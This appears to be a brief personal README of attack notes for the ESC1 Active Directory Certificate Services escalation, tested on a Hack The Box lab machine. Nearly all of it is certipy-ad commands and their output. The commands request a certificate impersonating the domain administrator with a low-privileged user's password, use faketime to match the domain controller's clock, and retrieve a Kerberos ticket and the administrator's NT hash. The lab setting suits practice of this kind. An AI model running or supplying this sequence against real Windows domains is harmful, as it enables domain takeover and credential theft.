# autoADCS

### ESC1
Tested on https://app.hackthebox.com/machines/531
```
certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 14
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
OR OR OR 

```
certipy-ad req -username ryan.cooper -password NuclearMosquito3 -ca sequel-DC-CA -target sequel.htb -template UserAuthentication -upn administrator@sequel.htb    
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
```
#### faketime
```
➜  escape ntpdate -q sequel.htb
2024-12-24 15:38:16.851156 (-0500) +28800.109132 +/- 0.083870 sequel.htb 10.10.11.202 s1 no-leap
```
```
➜  escape faketime '2024-12-24 15:38:34' certipy-ad auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
